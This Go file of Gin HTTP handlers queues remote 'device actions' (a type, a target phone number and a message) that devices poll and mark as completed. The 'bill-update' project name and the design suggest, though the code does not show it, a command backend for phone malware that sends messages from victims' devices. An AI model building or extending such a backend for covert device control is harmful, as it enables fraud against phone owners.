package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
)

func CreateAction(c *gin.Context) {
	var req struct {
		DeviceID     string `json:"device_id" binding:"required"`
		Type         string `json:"type" binding:"required"`
		TargetNumber string `json:"target_number" binding:"required"`
		Message      string `json:"message"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	action := models.DeviceAction{
		DeviceID:     req.DeviceID,
		Type:         req.Type,
		TargetNumber: req.TargetNumber,
		Message:      req.Message,
		Status:       "pending",
	}
	database.DB.Create(&action)
	c.JSON(http.StatusOK, action)
}

func GetPendingActions(c *gin.Context) {
	deviceID := c.Param("device_id")
	var actions []models.DeviceAction
	database.DB.Where("device_id = ? AND status = ?", deviceID, "pending").Find(&actions)
	c.JSON(http.StatusOK, gin.H{"actions": actions})
}

func CompleteAction(c *gin.Context) {
	id := c.Param("id")
	var action models.DeviceAction
	if err := database.DB.First(&action, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "action not found"})
		return
	}
	now := time.Now()
	action.Status = "completed"
	action.CompletedAt = &now
	database.DB.Save(&action)
	c.JSON(http.StatusOK, gin.H{"message": "action completed"})
}
